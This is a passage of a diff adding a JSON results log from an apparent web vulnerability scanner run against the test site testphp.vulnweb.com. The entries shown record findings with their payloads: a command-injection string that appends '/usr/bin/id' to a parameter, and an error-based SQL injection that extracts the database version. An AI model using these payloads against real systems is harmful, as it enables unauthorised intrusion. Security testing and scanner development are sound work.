+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2150
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:32:12",
+        "unix_timestamp": 1770478332
+      }
+    },
+    {
+      "id": 168,
+      "vulnerability_type": "RCE",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "artist",
+      "payload": "a;/usr/bin/id;",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2150
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:32:12",
+        "unix_timestamp": 1770478332
+      }
+    },
+    {
+      "id": 169,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/hpp/params.php",
+      "parameter": "p",
+      "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "p"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 55
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:33:33",
+        "unix_timestamp": 1770478413
+      }
+    },
+    {
+      "id": 170,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/hpp/params.php",
+      "parameter": "pp",
+      "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pp"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 55
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:33:55",
+        "unix_timestamp": 1770478435
+      }
+    }
+  ],
+  "total_vulnerabilities": 170,
+  "total_by_type": {
+    "xss": 71,
+    "sqli": 70,
+    "rce": 29
+  },
+  "last_updated": "2026-02-07 16:33:55"
+}
